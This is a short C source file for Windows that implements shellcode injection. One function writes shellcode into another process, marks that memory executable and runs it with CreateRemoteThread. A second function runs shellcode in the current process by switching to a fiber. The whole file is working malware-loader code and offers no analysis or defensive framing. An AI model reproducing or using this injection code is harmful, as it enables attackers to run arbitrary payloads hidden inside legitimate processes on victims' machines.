

#include "ShellcodeInjection.h"



int ShellcodeInjectSimple(HANDLE hProcess, char Shellcode[], int ShellcodeSize)
{
    // allocate shellcode space
    PVOID ShellcodeLocation = VirtualAllocEx(hProcess, 0, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD NoWrittenBytes = 0;
	WriteProcessMemory(hProcess, ShellcodeLocation, Shellcode, ShellcodeSize, &NoWrittenBytes);


    DWORD OldProtection = 0;
    VirtualProtectEx(hProcess, ShellcodeLocation, ShellcodeSize, PAGE_EXECUTE_READWRITE, &OldProtection);


    CreateRemoteThread(hProcess, NULL, NULL, ShellcodeLocation, NULL, NULL, NULL);


}
// Fiber injection
int ThreadToFiber(char Shellcode[], int ShellcodeSize) {
    // switch thread to fiber
    PVOID Fiber = ConvertThreadToFiber(NULL);

    // allocate shellcode space
    PVOID ShellcodeLocation = VirtualAlloc(0, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(ShellcodeLocation, Shellcode, ShellcodeSize);


    // create fiber with shellcode
    PVOID FiberWithShellcode = CreateFiber(NULL, (LPFIBER_START_ROUTINE)ShellcodeLocation, NULL);

    // run shellcode in fiber
    SwitchToFiber(FiberWithShellcode);


    return 0;
}
